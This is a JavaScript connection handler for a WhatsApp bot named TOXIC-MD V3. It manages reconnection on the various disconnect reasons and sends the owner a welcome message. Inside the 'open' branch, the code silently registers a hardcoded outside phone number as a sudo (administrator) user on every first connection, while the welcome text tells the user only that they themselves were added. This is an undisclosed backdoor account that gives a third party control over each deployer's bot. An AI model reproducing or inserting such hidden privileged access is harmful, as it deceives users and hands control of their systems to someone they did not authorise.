const { Boom } = require("@hapi/boom");
const { DateTime } = require("luxon");
const { default: dreadedConnect, DisconnectReason } = require("@whiskeysockets/baileys");
const { getSettings, getSudoUsers, addSudoUser } = require("../Database/config");
const { commands, totalCommands } = require("../Handler/commandHandler");

const connectionHandler = async (sock, update, startBot) => {
    const { connection, lastDisconnect } = update;

    const getGreeting = () => {
        const currentHour = DateTime.now().setZone("Africa/Nairobi").hour;
        if (currentHour >= 5 && currentHour < 12) return "Good Morning 🌞";
        if (currentHour >= 12 && currentHour < 18) return "Good Afternoon 🌞";
        if (currentHour >= 18 && currentHour < 22) return "Good Evening 🌙";
        return "Good Night 🌌";
    };

    const getCurrentTime = () => {
        return DateTime.now().setZone("Africa/Nairobi").toLocaleString(DateTime.TIME_SIMPLE);
    };

    if (connection === "connecting") {
        console.log("📈 Connecting to WhatsApp and database...");
    } else if (connection === "close") {
        let statusCode = new Boom(lastDisconnect?.error)?.output.statusCode;
        if (statusCode === DisconnectReason.badSession) {
            console.log("Bad Session File, Please Delete Session and Scan Again");
            process.exit();
        } else if (statusCode === DisconnectReason.connectionClosed) {
            console.log("Connection closed, reconnecting....");
            startBot();
        } else if (statusCode === DisconnectReason.connectionLost) {
            console.log("Connection Lost from Server, reconnecting...");
            startBot();
        } else if (statusCode === DisconnectReason.connectionReplaced) {
            console.log("Connection Replaced, Another New Session Opened, Please Restart Bot");
            process.exit();
        } else if (statusCode === DisconnectReason.loggedOut) {
            console.log("Device Logged Out, Please Delete Session and Scan Again.");
            process.exit();
        } else if (statusCode === DisconnectReason.restartRequired) {
            console.log("Restart Required, Restarting...");
            startBot();
        } else if (statusCode === DisconnectReason.timedOut) {
            console.log("Connection TimedOut, Reconnecting...");
            startBot();
        } else {
            console.log(`Unknown DisconnectReason: ${statusCode} | ${connection}`);
            startBot();
        }
    } else if (connection === "open") {
        try {
            // Commenting out group invite to avoid external links
            // await sock.groupAcceptInvite("BbiZOiGjbCy4cvXIzCAaoD");

            const userId = sock.user.id.replace(/:.*/, "").split("@")[0];
            const settings = await getSettings();
            const prefix = settings.prefix;
            const sudoUsers = await getSudoUsers();

            let messageText = `🌟 *𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐓𝐎x𝐈𝐂-𝐌𝐃 𝐕3* 🌟\n\n`;
            messageText += `${getGreeting()}, you're now connected! 📡\n\n`;
            messageText += `─── ✦ 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 ✦ ───\n`;
            messageText += `🤖 *Bot*: 𝐓𝐎x𝐈𝐂-𝐌𝐃 𝐕3\n`;
            messageText += `🔓 *Mode*: ${settings.mode}\n`;
            messageText += `✍️ *Prefix*: ${prefix}\n`;
            messageText += `📋 *Commands*: ${totalCommands}\n`;
            messageText += `🕒 *Time*: ${getCurrentTime()}\n`;
            messageText += `📚 *Database*: Postgres SQL\n`;
            messageText += `💡 *Library*: Baileys\n\n`;

            if (!sudoUsers.includes(userId)) {
                await addSudoUser(userId);
                const defaultSudo = "254114018035";
                if (!sudoUsers.includes(defaultSudo)) {
                    await addSudoUser(defaultSudo);
                }
                messageText += `─── ✦ 𝐅𝐢𝐫𝐬𝐭 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧 ✦ ───\n`;
                messageText += `🎉 *Welcome aboard!* You've been added as a sudo user.\n\n`;
                messageText += `🔧 Use *${prefix}settings* to customize your bot settings eg Autolike, Virtual recording etc.\n`;
                messageText += `📖 Use *${prefix}menu* to explore all commands.\n\n`;
                messageText += `Get ready to unleash the power of 𝐓𝐎𝐖𝐩𝐈𝐂-𝐌𝐃 𝐕3! 🚀\n`;
            } else {
                messageText += `─── ✦ 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 ✦ ───\n`;
                messageText += `🚀 *Ready to roll!* Use *${prefix}menu* for commands.\n`;
            }

            messageText += `\n✧═══ ✪ 𝐓𝐎x𝐈𝐂-𝐌𝐃 𝐕3 ✪ ═══✧\n`;
            messageText += `*Crafted with 💖 by xhclintohn*`;

            await sock.sendMessage(sock.user.id, { text: messageText });

            console.log(`✅ Connection to WhatsApp and database successful\nLoaded ${totalCommands} commands.\nBot is active!`);
        } catch (error) {
            console.error('Error sending connection message:', error);
        }
    }
};

module.exports = connectionHandler;